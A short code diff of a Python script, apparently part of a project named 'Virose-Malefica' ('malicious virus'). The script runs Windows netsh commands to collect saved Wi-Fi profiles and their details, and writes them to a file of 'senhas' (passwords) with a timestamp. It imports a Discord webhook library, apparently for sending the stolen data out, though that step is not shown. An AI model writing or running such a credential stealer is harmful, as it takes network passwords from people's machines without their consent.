@@ -1,11 +1,6 @@
-import requests
 import subprocess
-import os
 import datetime
 from discord_webhook import DiscordWebhook
-import json
-
-dia = datetime.datetime.now()
 
 def get_networks():
     information_command = subprocess.check_output("netsh wlan show profiles", encoding="cp858", shell=True)
@@ -32,6 +27,7 @@ def information_network(wifi):
 if __name__ == "__main__":
     print(get_networks())
 
+dia = datetime.datetime.now()
 
 with open ("Virose-Malefica/senhas.txt", "w") as arquivos:
     arquivos.write("As senhas do dia sao: {} // {} ".format(get_networks(),dia))
